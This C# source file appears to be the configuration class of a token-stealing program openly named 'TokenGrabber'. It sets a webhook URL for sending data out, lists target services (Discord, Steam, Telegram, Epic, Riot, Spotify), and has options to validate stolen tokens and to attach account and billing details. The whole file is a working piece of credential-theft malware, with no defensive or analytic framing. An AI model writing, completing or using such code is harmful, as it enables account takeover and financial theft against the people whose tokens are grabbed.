namespace TokenGrabber.Config;

using System.Text.Json;

internal sealed class GrabberConfig
{
    public string WebhookUrl { get; init; } = string.Empty;
    public List<string> Targets { get; init; } = ["discord", "steam", "telegram", "epic", "riot", "spotify"];
    public bool ValidateTokens { get; init; } = true;
    public bool IncludeAccountInfo { get; init; } = true;
    public bool IncludeBilling { get; init; }

    public static GrabberConfig Load()
    {
        var envWebhook = Environment.GetEnvironmentVariable("GRABBER_WEBHOOK");
        var configPath = Path.Combine(AppContext.BaseDirectory, "config.json");

        if (File.Exists(configPath))
        {
            var json = File.ReadAllText(configPath);
            var config = JsonSerializer.Deserialize<GrabberConfig>(json);
            if (config != null)
                return config;
        }

        return new GrabberConfig
        {
            WebhookUrl = envWebhook ?? string.Empty
        };
    }
}
